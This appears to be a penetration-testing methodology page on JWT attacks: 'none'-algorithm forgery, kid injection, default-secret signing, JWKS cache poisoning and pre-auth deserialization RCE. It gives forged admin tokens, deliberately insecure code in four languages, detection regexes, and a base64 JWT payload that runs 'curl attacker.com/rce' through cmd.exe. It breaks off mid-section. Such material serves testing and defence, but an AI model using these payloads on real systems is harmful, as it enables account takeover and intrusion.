# JSON Web Tokens

## Check List

## Methodology

### [Black Box](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

#### **None Algorithm**

{% stepper %}
{% step %}
Log in to the target site, complete the authentication process, and inspect the requests using Burp Suite
{% endstep %}

{% step %}
If the requests used jwt, decode it using the Burp suite extension called JWT Editor or copy it and decode it on the following site

Paste token into [https://jwt.io](https://jwt.io/)
{% endstep %}

{% step %}
header like

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

and payload&#x20;

```json
{
  "user": "guest",
  "role": "user"
}
```
{% endstep %}

{% step %}
Create this exact JWT (no signature needed)

```json
{
  "alg": "none",
  typ": "JWT"
}
```

We can write none payloads in uppercase and lowercase, like this

* none
* None
* NONE
* nOnE
{% endstep %}

{% step %}
Now inject the word admin in the payload request as follows

```json
{
  "user": "admin",
  "role": "admin",
  "iat": 1731670400,
  "exp": 9999999999
}
```
{% endstep %}

{% step %}
Now convert the request to base64 and replace the previous Jwt token

Base64URL encode header like → `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
{% endstep %}

{% step %}
Base64URL encode payload like → `eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MzE2NzA0MDAsImV4cCI6OTk5OTk5OTk5OX0`

Append `.` + empty string → final token

```json
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MzE2NzA0MDAsImV4cCI6OTk5OTk5OTk5OX0.
```
{% endstep %}

{% step %}
Then, after replacing the tampered jwt token with the previous jwt that the server had set, we send the request
{% endstep %}

{% step %}
Then we check in localstorage whether the tampered jwt is stored or not and if it is stored we check whether we have access to an admin feature or admin pages and if we have access the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### KID Manipulation Vulnerability

{% stepper %}
{% step %}
Access the target application and locate login or authenticated endpoints
{% endstep %}

{% step %}
Inspect network traffi Burp Suite to identify JWT tokens in headers (Authorization: Bearer ...) or localStorage
{% endstep %}

{% step %}
Copy a valid JWT token and decode it using a tool like [jwt.io](https://jwt.io)
{% endstep %}

{% step %}
Examine the header to confirm the presence of the kid (Key ID) field,

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "1"
}
```
{% endstep %}

{% step %}
Modify the kid value to point to a publicly accessible file

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../public/css/style.css"
}
```
{% endstep %}

{% step %}
Re-encode the token with the manipulated header and an empty or arbitrary payload, ensuring the signature matches the file content (if server uses file as key)
{% endstep %}

{% step %}
Send the forged token to the application via an authenticated request
{% endstep %}

{% step %}
Check if the application accepts the token and grants access
{% endstep %}

{% step %}
If successful, the server is using the specified file (main.css) as the verification key, bypassing intended security
{% endstep %}
{% endstepper %}

***

#### SQL Injection Via KID

{% stepper %}
{% step %}
Modify the kid value to inject SQL

```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "1' UNION SELECT 'mysecret'--"
}
```
{% endstep %}

{% step %}
Re-encode the token with the manipulated header and sign it using the injected string (key or secret) as the HMAC secret
{% endstep %}

{% step %}
Submit the token to the application
{% endstep %}

{% step %}
Verify if the application validates the token using the injected string as the secret key
{% endstep %}

{% step %}
If access is granted, the kid parameter is vulnerable to SQL injection, allowing arbitrary key manipulation
{% endstep %}
{% endstepper %}

***

#### JWT Forging via Default Secret Exploitation

{% stepper %}
{% step %}
Sign up and log in to the target application while proxying traffic through Burp Suite
{% endstep %}

{% step %}
Capture the /api/auth/login (equivalent) POST request and its response containing the JWT token
{% endstep %}

{% step %}
Decode the JWT using [jwt.io](https://jwt.io) or [token.dev](https://token.dev/)
{% endstep %}

{% step %}
Observe the payload contains `sub`, `role`, `role_id`, `exp`
{% endstep %}

{% step %}
Check Burp Suite’s **Issues** tab for a warning `JWT signed with default secret: CHANGE_ME`
{% endstep %}

{% step %}
Confirm the application uses `HMAC` with the hardcoded secret `CHANGE_ME`
{% endstep %}

{% step %}
Create a forged payload targeting admin access like

```json
{
  "sub": "1",
  "role": "admin",
  "role_id": 1,
  "exp": 9999999999
}
```
{% endstep %}

{% step %}
Sign the token using HS256 and the secret CHANGE\_ME
{% endstep %}

{% step %}
In Burp Suite, configure Match and Replace rule
{% endstep %}

{% step %}
Forward all subsequent requests with the forged token
{% endstep %}

{% step %}
If you see the following values ​​in the server response, it means you have access to the admin dashboard or sensitive data
{% endstep %}
{% endstepper %}

***

#### JWT Refresh Token Association Bypass

{% stepper %}
{% step %}
Register Test Account A and Test Account B on the target platform
{% endstep %}

{% step %}
Log in to each account separately to obtain

* Access Token A + Refresh Token A
* Access Token B + Refresh Token B
{% endstep %}

{% step %}
From Test Account A, trigger a token refresh

```http
POST /auth/refresh HTTP/1.1
Authorization: Bearer [Access_Token_A]
Content-Type: application/json

{"refresh_token": "Refresh_Token_A"}
```
{% endstep %}

{% step %}
Capture the new access token returned
{% endstep %}

{% step %}
Use Test Account B’s refresh token with Test Account A’s access token

```http
POST /auth/refresh HTTP/1.1
Authorization: Bearer [Access_Token_A]
Content-Type: application/json

{"refresh_token": "Refresh_Token_B"}
```
{% endstep %}

{% step %}
Send the request
{% endstep %}

{% step %}
If response contains a new valid access token with Test Account A’s identity → Association bypass confirmed
{% endstep %}
{% endstepper %}

***

#### Replay Attack

{% stepper %}
{% step %}
Log in to the target application
{% endstep %}

{% step %}
Capture a valid JWT from `Authorization: Bearer` header or response body
{% endstep %}

{% step %}
Browse the app and trigger actions like Profile update
{% endstep %}

{% step %}
In Burp Repeater Copy a state-changing request (`POST /api/user/update`), Do not modify any parameter or timestamp, Send multiple times with the same JWT
{% endstep %}

{% step %}
If each replay executes the action again (`profile updated 5 times, 5 emails sent`)\
,Replay attack confirmed
{% endstep %}
{% endstepper %}

***

### White Box

#### Token Forgery via JWKS Cache Poisoning in Multi-Tenant OIDC Discovery

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the enterprise's multi-tenant architecture. B2B platforms often allow enterprise customers to "Bring Your Own Identity Provider" (BYO-IdP), enabling SAML or OIDC federation using Okta, Azure AD, or PingIdentity
{% endstep %}

{% step %}
Investigate the API Gateway's JWT validation pipeline. When a request arrives, the gateway must cryptographically verify the JWT signature
{% endstep %}

{% step %}
Understand the engineering bottleneck: Fetching the external Identity Provider's JSON Web Key Set (JWKS) via HTTP on every single API request introduces crippling latency (often 100ms+ per request)
{% endstep %}

{% step %}
Discover the architectural optimization: The API Gateway utilizes a global distributed cache (e.g., Redis) to store the retrieved RSA Public Keys in memory
{% endstep %}

{% step %}
Analyze the decompiled validation logic. To determine _which_ IdP to query for the public key, the gateway parses the unverified JWT payload, extracts the `iss` (Issuer) claim, appends `/.well-known/openid-configuration`, and fetches the JWKS URI
{% endstep %}

{% step %}
Locate the caching mechanism. Observe how the retrieved public key is stored in the cache. Developers frequently key this cache using solely the `kid` (Key ID) extracted from the JWT header, assuming that UUID-based `kid`s are globally unique
{% endstep %}

{% step %}
Recognize the fatal assumption: The cache key relies entirely on the `kid` without concatenating the `iss` (Issuer) to namespace it
{% endstep %}

{% step %}
Setup a malicious OIDC Identity Provider on an attacker-controlled server. Host a custom JWKS endpoint containing your own RSA Public Key, but explicitly hardcode the `kid` in your JWKS to exactly match the `kid` of the enterprise's highly privileged, internal Identity Provider
{% endstep %}

{% step %}
Mint a dummy JWT signed by your attacker private key. Set the `iss` to your malicious IdP, and the `kid` to the target internal Key ID
{% endstep %}

{% step %}
Send this JWT to the API Gateway. The gateway decodes the unverified payload, reads your `iss`, fetches your malicious JWKS, extracts your attacker public key, and globally caches it under the target `kid`
{% endstep %}

{% step %}
Immediately mint a second JWT. This time, forge the payload to contain `iss: internal-enterprise-idp` and `role: SuperAdmin`. Sign it with your attacker private key, using the same `kid`
{% endstep %}

{% step %}
Send the forged Admin JWT. The Gateway decodes the header, extracts the `kid`, checks the global cache, finds your poisoned public key, and mathematically validates the signature of the forged token, granting you complete system compromise

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Jwks?Cache\.(?:Set|Add|TryAdd|GetOrCreate|GetOrCreateAsync)\s*\(\s*(?:kid|keyId|header\.Kid|header\.KeyId)\s*,|(?:MemoryCache|IMemoryCache|IDistributedCache)\.(?:Set|SetAsync|GetOrCreate|GetOrCreateAsync)\s*\(\s*(?:kid|keyId|header\.Kid|header\.KeyId)\s*,|ConcurrentDictionary<[^>]+>\.(?:TryAdd|AddOrUpdate)\s*\(\s*(?:kid|keyId)\s*,|JwtSecurityToken(?:Header)?[\s\S]{0,120}?(?:Kid|KeyId))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:cache\.(?:put|putIfAbsent|computeIfAbsent)\s*\(\s*(?:header\.getKeyId\(\)|header\.getKid\(\)|kid|keyId)\s*,|LoadingCache\b[\s\S]{0,120}?(?:put|get)|CacheBuilder\b|ConcurrentHashMap\b[\s\S]{0,120}?(?:put|computeIfAbsent)|JWKSet\b[\s\S]{0,120}?cache|NimbusJwtDecoder\b)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:(?:\$cache|Cache|Redis)->(?:put|set|remember|rememberForever)\s*\(\s*\$(?:kid|keyId)\s*,|Cache::(?:put|remember|rememberForever)\s*\(\s*\$(?:kid|keyId)\s*,|JWK(?:Set)?[\s\S]{0,120}?Cache|Firebase\\JWT\\JWK\b)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:cache\.(?:set|put)\s*\(\s*(?:kid|keyId|header\.kid)\s*,|Map\s*\.\s*set\s*\(\s*(?:kid|keyId)\s*,|lruCache\.set\s*\(\s*(?:kid|keyId)\s*,|jwksClient\b[\s\S]{0,120}?(?:getSigningKey|getKeys)|createRemoteJWKSet\b|jose\b[\s\S]{0,120}?JWK)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Jwks?Cache\.(?:Set|Add|TryAdd|GetOrCreate|GetOrCreateAsync)\s*\(\s*(?:kid|keyId|header\.Kid|header\.KeyId)\s*,|(?:MemoryCache|IMemoryCache|IDistributedCache)\.(?:Set|SetAsync|GetOrCreate|GetOrCreateAsync)\s*\(\s*(?:kid|keyId|header\.Kid|header\.KeyId)\s*,|ConcurrentDictionary<[^>]+>\.(?:TryAdd|AddOrUpdate)\s*\(\s*(?:kid|keyId)\s*,|JwtSecurityToken(?:Header)?.*(?:Kid|KeyId))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:cache\.(?:put|putIfAbsent|computeIfAbsent)\s*\(\s*(?:header\.getKeyId\(\)|header\.getKid\(\)|kid|keyId)\s*,|LoadingCache.*(?:put|get)|CacheBuilder\b|ConcurrentHashMap.*(?:put|computeIfAbsent)|JWKSet.*cache|NimbusJwtDecoder\b)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:(?:\$cache|Cache|Redis)->(?:put|set|remember|rememberForever)\s*\(\s*\$(?:kid|keyId)\s*,|Cache::(?:put|remember|rememberForever)\s*\(\s*\$(?:kid|keyId)\s*,|JWK(?:Set)?.*Cache|Firebase\\JWT\\JWK\b)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:cache\.(?:set|put)\s*\(\s*(?:kid|keyId|header\.kid)\s*,|Map\s*\.\s*set\s*\(\s*(?:kid|keyId)\s*,|lruCache\.set\s*\(\s*(?:kid|keyId)\s*,|jwksClient.*(?:getSigningKey|getKeys)|createRemoteJWKSet\b|jose.*JWK)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class JwksValidationService
{
    private readonly IDistributedCache _keyCache;
    private readonly HttpClient _httpClient;

    public async Task<SecurityKey> GetPublicKeyAsync(string token)
    {
        // [1]
        var handler = new JwtSecurityTokenHandler();
        var unverifiedToken = handler.ReadJwtToken(token);
        
        var kid = unverifiedToken.Header.Kid;
        var iss = unverifiedToken.Payload.Iss;

        // [2]
        // [3]
        var cachedKey = await _keyCache.GetStringAsync(kid);
        if (!string.IsNullOrEmpty(cachedKey))
        {
            return new JsonWebKey(cachedKey);
        }

        // [4]
        var jwksResponse = await _httpClient.GetStringAsync($"{iss}/.well-known/jwks.json");
        var jwks = new JsonWebKeySet(jwksResponse);
        var publicKey = jwks.Keys.FirstOrDefault(k => k.Kid == kid);

        if (publicKey != null)
        {
            await _keyCache.SetStringAsync(kid, JsonConvert.SerializeObject(publicKey));
            return publicKey;
        }

        throw new SecurityException("Key not found");
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class JwksValidationService {

    @Autowired
    private RedisTemplate<String, String> keyCache;
    @Autowired
    private RestTemplate restTemplate;

    public RSAPublicKey getPublicKey(String token) throws Exception {
        // [1]
        DecodedJWT unverifiedJwt = JWT.decode(token);
        String kid = unverifiedJwt.getKeyId();
        String iss = unverifiedJwt.getIssuer();

        // [2]
        // [3]
        String cachedKey = keyCache.opsForValue().get(kid);
        if (cachedKey != null) {
            return parsePublicKey(cachedKey);
        }

        // [4]
        String jwksUri = iss + "/.well-known/jwks.json";
        String jwksJson = restTemplate.getForObject(jwksUri, String.class);
        
        JWKSet jwkSet = JWKSet.parse(jwksJson);
        JWK publicKey = jwkSet.getKeyByKeyId(kid);

        if (publicKey != null) {
            keyCache.opsForValue().set(kid, publicKey.toJSONString());
            return publicKey.toRSAKey().toRSAPublicKey();
        }

        throw new SecurityException("Key not found");
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class JwksValidationService
{
    protected $keyCache;
    protected $httpClient;

    public function getPublicKey(string $token)
    {
        // [1]
        $parts = explode('.', $token);
        $header = json_decode(base64_decode($parts[0]));
        $payload = json_decode(base64_decode($parts[1]));

        $kid = $header->kid;
        $iss = $payload->iss;

        // [2]
        // [3]
        $cachedKey = $this->keyCache->get($kid);
        if ($cachedKey) {
            return JWKFactory::createFromJsonObject($cachedKey);
        }

        // [4]
        $jwksJson = $this->httpClient->get("{$iss}/.well-known/jwks.json")->getBody();
        $jwks = json_decode($jwksJson, true);

        foreach ($jwks['keys'] as $key) {
            if ($key['kid'] === $kid) {
                $this->keyCache->put($kid, $key);
                return JWKFactory::createFromValues($key);
            }
        }

        throw new Exception("Key not found");
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class JwksValidationService {
    constructor(keyCache, httpClient) {
        this.keyCache = keyCache;
        this.httpClient = httpClient;
    }

    async getPublicKey(token) {
        // [1]
        let unverifiedToken = jwt.decode(token, { complete: true });
        let kid = unverifiedToken.header.kid;
        let iss = unverifiedToken.payload.iss;

        // [2]
        // [3]
        let cachedKey = await this.keyCache.get(kid);
        if (cachedKey) {
            return jwkToPem(JSON.parse(cachedKey));
        }

        // [4]
        let jwksResponse = await this.httpClient.get(`${iss}/.well-known/jwks.json`);
        let jwks = jwksResponse.data;

        let publicKey = jwks.keys.find(k => k.kid === kid);

        if (publicKey) {
            await this.keyCache.set(kid, JSON.stringify(publicKey));
            return jwkToPem(publicKey);
        }

        throw new Error("Key not found");
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The system extracts routing claims (`iss` and `kid`) from the mathematically unverified token payload. This is standard procedure in federated architecture, as the system must know which IdP to trust before verifying the signature, \[2] The architectural optimization executes. To save hundreds of milliseconds of HTTP latency, the gateway queries the distributed cache for the Public Key, \[3] The fundamental trust boundary violation occurs here. The developer keys the global cache exclusively using the `kid` string. They falsely assume that because their internal IdP generates UUID-v4 Key IDs, collisions are mathematically impossible, completely forgetting that external BYO-IdPs can hardcode arbitrary `kid` values, \[4] On a cache miss, the system fetches the public key from the unverified `iss` endpoint and inserts it into the global cache under the attacker-controlled `kid`, completely poisoning the cryptographic material for all subsequent requests sharing that Key ID

```http
// 1. Attacker sends a JWT triggering the Cache Poisoning.
// Header: {"alg":"RS256", "kid":"INTERNAL_ADMIN_KEY_UUID"}
// Payload: {"iss":"https://attacker-idp.com", "sub":"attacker"}
GET /api/v1/profile HTTP/1.1
Host: gateway.enterprise.tld
Authorization: Bearer eyJhbG...[POISONING_TOKEN]...

// 2. Gateway fetches attacker's JWKS, caches attacker's public key under "INTERNAL_ADMIN_KEY_UUID".
// 3. Attacker immediately sends the Forged Token.
// Header: {"alg":"RS256", "kid":"INTERNAL_ADMIN_KEY_UUID"}
// Payload: {"iss":"https://internal.enterprise.tld", "role":"SuperAdmin", "sub":"admin"}
// (Signed by Attacker's Private Key)
POST /api/v1/system/provision-tenant HTTP/1.1
Host: gateway.enterprise.tld
Authorization: Bearer eyJhbG...[FORGED_ADMIN_TOKEN]...
```
{% endstep %}

{% step %}
To support low-latency B2B identity federation, the API Gateway implemented a Redis-backed caching tier for RSA Public Keys. By namespacing the cache exclusively with the `kid` parameter, the developers introduced a cryptographic namespace collision. When the attacker presents a token containing their own `iss` but the target's `kid`, the Gateway fetches the attacker's public key and caches it over the internal key space. When the forged administrator token is presented milliseconds later, the Gateway retrieves the poisoned public key from Redis. The attacker's signature validates mathematically against the attacker's public key, the Gateway assumes the token was issued by the internal IdP, and complete remote system compromise is achieved
{% endstep %}
{% endstepper %}

***

#### Remote Code Execution via Eager Telemetry Deserialization in Service Meshes

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify if the enterprise utilizes an advanced Service Mesh (e.g., Istio, Linkerd) or an API Gateway that implements Distributed Tracing (e.g., OpenTelemetry, Datadog, Jaeger)
{% endstep %}

{% step %}
Understand the observability requirement: In microservice architectures, an HTTP request may traverse 15 different services. To trace a single user's journey, the API Gateway must extract a "Tenant ID" or "User ID" at the very edge of the network and inject it into the `b3` or `traceparent` headers before passing the request downstream
{% endstep %}

{% step %}
Investigate the "Eager Parsing" optimization. Full cryptographic validation of an RSA-signed JWT is computationally heavy. If a request is destined to be rejected downstream anyway (e.g., due to a 404), spending CPU cycles verifying the signature at the tracing tier is inefficient
{% endstep %}

{% step %}
Discover that developers optimize this by implementing a lightweight Telemetry Middleware that executes _before_ the Authorization Middleware. This middleware blindly Base64Url-decodes the JWT payload and parses it into a DTO to extract the tracing tags
{% endstep %}

{% step %}
Analyze the JSON deserialization library used in this eager telemetry layer. In statically typed enterprise languages, parsing raw JSON into a generic `Dictionary` can be cumbersome, so developers often use the project's globally configured JSON mapper to map the payload directly into a `JwtPayloadDto`
{% endstep %}

{% step %}
Recognize the fatal deserialization flaw: If the global JSON mapper is configured to support Polymorphic Deserialization (e.g., `TypeNameHandling.Auto` in C# or `enableDefaultTyping` in Java) for internal messaging, invoking it on unverified JWT payloads introduces a critical vulnerability
{% endstep %}

{% step %}
Construct a malicious JWT. Ensure the Header and Signature are syntactically valid (e.g., signed with a dummy secret), but replace the Payload with a Base64Url-encoded JSON object containing a known Deserialization Gadget Chain for the target language
{% endstep %}

{% step %}
Send the malicious JWT to any endpoint
{% endstep %}

{% step %}
The Eager Telemetry Middleware intercepts the request, Base64-decodes your payload, and passes it to the vulnerable polymorphic deserializer to extract the `tenant_id`
{% endstep %}

{% step %}
The deserializer encounters your injected type declarations (e.g., `$type` or `@class`), instantiates the gadget chain, and executes arbitrary code on the API Gateway
{% endstep %}

{% step %}
The Authorization Middleware is never reached, meaning the fact that the JWT signature is invalid is entirely irrelevant
{% endstep %}

{% step %}
**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:TypeNameHandling\s*=\s*TypeNameHandling\.(?:Auto|All|Objects)|JsonSerializerSettings\b[\s\S]{0,150}?TypeNameHandling|MetadataPropertyHandling\s*=\s*MetadataPropertyHandling\.ReadAhead|SerializationBinder\s*=|ISerializationBinder\b|BinaryFormatter\b|NetDataContractSerializer\b|LosFormatter\b|ObjectStateFormatter\b|SoapFormatter\b|DataContractSerializer\b[\s\S]{0,120}?ReadObject|JsonConvert\.DeserializeObject(?:<[^>]+>)?\s*\(|JsonSerializer\.Deserialize\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:mapper\.enableDefaultTyping\s*\(|activateDefaultTyping\s*\(|enableDefaultTypingAsProperty\s*\(|ObjectMapper\b[\s\S]{0,150}?(?:readValue|readTree|treeToValue)|readValue\s*\([^)]*Object\.class|XStream\b|XMLDecoder\b|ObjectInputStream\b|readObject\s*\(|Yaml\.load\s*\(|SnakeYAML\b)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:unserialize\s*\(|unserialize\s*\(\s*base64_decode\s*\(|serialize\.unserialize\s*\(|igbinary_unserialize\s*\(|Symfony\\Component\\Serializer|SerializerInterface->deserialize|->deserialize\s*\(|json_decode\s*\([^)]*,\s*false\s*\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:JSON\.parse\s*\(|deserialize\s*\(|v8\.deserialize\s*\(|node:v8\b|BSON\.deserialize\s*\(|EJSON\.deserialize\s*\(|yaml\.load\s*\(|jsYaml\.load\s*\(|serialize-javascript\b|superjson\.parse\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:TypeNameHandling\s*=\s*TypeNameHandling\.(?:Auto|All|Objects)|JsonSerializerSettings.*TypeNameHandling|MetadataPropertyHandling\s*=\s*MetadataPropertyHandling\.ReadAhead|SerializationBinder\s*=|ISerializationBinder\b|BinaryFormatter\b|NetDataContractSerializer\b|LosFormatter\b|ObjectStateFormatter\b|SoapFormatter\b|DataContractSerializer.*ReadObject|JsonConvert\.DeserializeObject(?:<[^>]+>)?\s*\(|JsonSerializer\.Deserialize\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:mapper\.enableDefaultTyping\s*\(|activateDefaultTyping\s*\(|enableDefaultTypingAsProperty\s*\(|ObjectMapper.*(?:readValue|readTree|treeToValue)|readValue\s*\([^)]*Object\.class|XStream\b|XMLDecoder\b|ObjectInputStream\b|readObject\s*\(|Yaml\.load\s*\(|SnakeYAML\b)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:unserialize\s*\(|unserialize\s*\(\s*base64_decode\s*\(|serialize\.unserialize\s*\(|igbinary_unserialize\s*\(|Symfony\\Component\\Serializer|SerializerInterface->deserialize|->deserialize\s*\(|json_decode\s*\([^)]*,\s*false\s*\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:JSON\.parse\s*\(|deserialize\s*\(|v8\.deserialize\s*\(|node:v8\b|BSON\.deserialize\s*\(|EJSON\.deserialize\s*\(|yaml\.load\s*\(|jsYaml\.load\s*\(|serialize-javascript\b|superjson\.parse\s*\()
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class OpenTelemetryMiddleware 
{
    private readonly JsonSerializerSettings _settings;

    public OpenTelemetryMiddleware() 
    {
        // Global project settings, commonly used for RabbitMQ/Kafka messaging
        _settings = new JsonSerializerSettings { 
            TypeNameHandling = TypeNameHandling.Auto 
        };
    }

    public async Task InvokeAsync(HttpContext context, RequestDelegate next) 
    {
        var token = context.Request.Headers["Authorization"].ToString().Replace("Bearer ", "");
        
        if (!string.IsNullOrEmpty(token)) 
        {
            try 
            {
                // [1]
                var parts = token.Split('.');
                if (parts.Length == 3) 
                {
                    // [2]
                    var payloadJson = Base64UrlDecode(parts[1]);
                    
                    // [3]
                    // [4]
                    var dto = JsonConvert.DeserializeObject<TelemetryDto>(payloadJson, _settings);
                    
                    var activity = Activity.Current;
                    activity?.AddTag("tenant.id", dto.TenantId);
                }
            }
            catch { /* Ignore parsing errors, let Auth middleware handle it */ }
        }

        await next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
public class OpenTelemetryFilter implements Filter {

    private ObjectMapper mapper;

    public OpenTelemetryFilter() {
        mapper = new ObjectMapper();
        // Global project settings, commonly used for distributed caching
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) {
        HttpServletRequest req = (HttpServletRequest) request;
        String authHeader = req.getHeader("Authorization");

        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            try {
                // [1]
                String[] parts = authHeader.substring(7).split("\\.");
                if (parts.length == 3) {
                    // [2]
                    String payloadJson = new String(Base64.getUrlDecoder().decode(parts[1]));
                    
                    // [3]
                    // [4]
                    TelemetryDto dto = mapper.readValue(payloadJson, TelemetryDto.class);
                    
                    Span currentSpan = Tracer.currentSpan();
                    if (currentSpan != null) {
                        currentSpan.tag("tenant.id", dto.getTenantId());
                    }
                }
            } catch (Exception e) { /* Ignore parsing errors */ }
        }

        chain.doFilter(request, response);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class OpenTelemetryMiddleware 
{
    public function handle($request, Closure $next) 
    {
        $authHeader = $request->header('Authorization');

        if ($authHeader && strpos($authHeader, 'Bearer ') === 0) 
        {
            try {
                // [1]
                $parts = explode('.', substr($authHeader, 7));
                if (count($parts) === 3) 
                {
                    // [2]
                    $payloadJson = base64_decode(strtr($parts[1], '-_', '+/'));
                    
                    // [3]
                    // [4]
                    // Explicit unserialize used for highly optimized caching objects in legacy architectures
                    $dto = unserialize($payloadJson, ['allowed_classes' => true]);
                    
                    if ($dto && isset($dto->tenantId)) {
                        OpenTracing::currentSpan()->setTag('tenant.id', $dto->tenantId);
                    }
                }
            } catch (\Exception $e) { /* Ignore */ }
        }

        return $next($request);
    }
}ش
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class OpenTelemetryMiddleware {
    static handle(req, res, next) {
        let authHeader = req.headers['authorization'];

        if (authHeader && authHeader.startsWith('Bearer ')) {
            try {
                // [1]
                let parts = authHeader.substring(7).split('.');
                if (parts.length === 3) {
                    // [2]
                    let payloadJson = Buffer.from(parts[1], 'base64').toString('utf8');
                    
                    // [3]
                    // [4]
                    // node-serialize used internally for complex object transmission via IPC
                    let dto = serialize.unserialize(payloadJson);
                    
                    if (dto && dto.tenantId) {
                        tracer.currentSpan().setTag('tenant.id', dto.tenantId);
                    }
                }
            } catch (e) { /* Ignore parsing errors */ }
        }

        next();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The tracing middleware executes at the very edge of the application lifecycle, intercepting the request before the heavy cryptographic verification middleware. It naively splits the token using the dot `.` delimiter, \[2] The middleware Base64Url-decodes the payload, transforming the mathematical signature challenge into raw, user-controlled strings, \[3] The architecture recycles the application's global serialization engine. In enterprise software, global serializers are frequently configured to support complex polymorphic object graphs for internal Event Sourcing, Redis caching, or message queue transmission, \[4] The fatal execution sink. The serializer parses the unverified JSON string. Upon encountering attacker-injected type specifiers, the engine instantiates dangerous internal gadget classes, leading to immediate Remote Code Execution. The cryptographic signature of the JWT is never checked, entirely neutralizing JWT's core security premise

```http
// 1. Attacker generates a serialized RCE payload using an established gadget chain (e.g., ObjectDataProvider in C#).
// 2. Attacker Base64Url-encodes the payload and constructs a structurally valid JWT with an invalid signature.

POST /api/health HTTP/1.1
Host: gateway.enterprise.tld
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyIkdHlwZSI6IlN5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1IiwiTWV0aG9kTmFtZSI6IlN0YXJ0IiwiT2JqZWN0SW5zdGFuY2UiOnsiJHR5cGUiOiJTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSIsIlN0YXJ0SW5mbyI6eyIkdHlwZSI6IlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0iLCJGaWxlTmFtZSI6ImNtZC5leGUiLCJBcmd1bWVudHMiOiIvYyBjdXJsIGF0dGFja2VyLmNvbS9yY2UifX19.INVALID_SIGNATURE_PADDINGS

// 3. The API Gateway receives the request.
// 4. The Eager Telemetry Middleware attempts to read the `tenant.id` for Jaeger logging.
// 5. The RCE payload triggers synchronously.
```
{% endstep %}

{% step %}
To fulfill enterprise observability metrics without increasing average latency, developers implemented eager JWT payload deserialization before cryptographic validation. By reusing the global application serialization settings inside the telemetry middleware, the developers inadvertently exposed a pre-auth Deserialization sink to the public internet. The attacker supplies a JWT containing an unverified payload. The eager parser instantiates the polymorphic gadget chain inside the JSON body, executing arbitrary system commands before the application ever attempts to validate the signature, resulting in zero-click Remote Code Execution on the API Gateway
{% endstep %}
{% endstepper %}

***

#### Privilege Escalation via JWT Claim Shadowing in Federated Token Exchange Pipelines

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
